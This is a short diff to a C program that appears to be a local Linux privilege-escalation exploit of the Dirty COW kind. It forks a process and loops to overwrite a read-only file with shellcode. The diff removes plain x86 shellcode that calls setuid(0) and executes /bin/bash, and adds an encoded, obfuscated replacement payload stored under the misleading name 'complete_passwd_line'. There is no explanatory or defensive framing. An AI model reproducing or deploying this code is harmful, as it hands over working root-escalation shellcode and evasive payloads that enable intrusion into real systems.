@@ -101,10 +101,12 @@ int main(int argc, char *argv[])
     exit(ret);
   }
    
- char *complete_passwd_line = "\x31\xdb\x6a\x17\x58\xcd\x80\x6a\x0b\x58\x99\x52\x66\x68\x2d"
-                              "\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3"
-                              "\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
-                              "\x00\x57\x53\x89\xe1\xcd\x80";
+ unsigned char *complete_passwd_line = "\xda\xd2\xb8\xeb\x9e\x75\x07\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
+                                       "\x0e\x83\xeb\xfc\x31\x43\x13\x03\xa8\x8d\x97\xf2\x1f\x69\x3d"
+                                       "\xea\x07\x40\x42\x7e\xbc\x02\xda\x2d\xa4\xda\xf1\xb2\xa1\xfc"
+                                       "\x62\x1a\xc2\x6a\x73\x0c\x0b\x09\x1a\xa2\xda\x2e\x8e\xd2\xd6"
+                                       "\xb0\x2f\x23\xc9\xd2\x46\x4d\x3a\x71\xf8\xe2\x2c\x75\xad\x57"
+                                       "\x25\x94\x9c\xd8";
   printf("Complete shell code:\n%s\nLength of the code is %d\n", complete_passwd_line, strlen(complete_passwd_line));
 
   f = open(filename, O_RDONLY);
@@ -120,7 +122,7 @@ int main(int argc, char *argv[])
   if(pid) {
     waitpid(pid, NULL, 0);
     int u, i, o, c = 0;
-    int l=strlen(complete_passwd_line);
+    unsigned int l=strlen(complete_passwd_line);
     for(i = 0; i < 10000/l; i++) {
       for(o = 0; o < l; o++) {
         for(u = 0; u < 10000; u++) {
